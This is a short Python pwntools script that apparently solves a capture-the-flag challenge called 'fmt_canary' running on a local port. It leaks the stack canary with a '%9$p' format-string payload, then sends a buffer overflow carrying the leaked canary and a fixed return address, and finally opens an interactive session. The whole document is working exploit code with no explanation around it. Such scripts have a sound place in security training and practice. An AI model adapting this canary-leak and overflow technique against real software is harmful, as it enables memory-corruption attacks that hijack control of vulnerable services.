from pwn import *

io = remote('localhost', '8311')
# io = process('./fmt_canary')

io.recvline()
io.sendline(b'%9$p')
canary = int(io.recvline(keepends=False).decode(), 16)

io.recvline()
io.sendline(b'a'*0x18 + p64(canary) + p64(0) + p64(0x401186))

io.interactive()
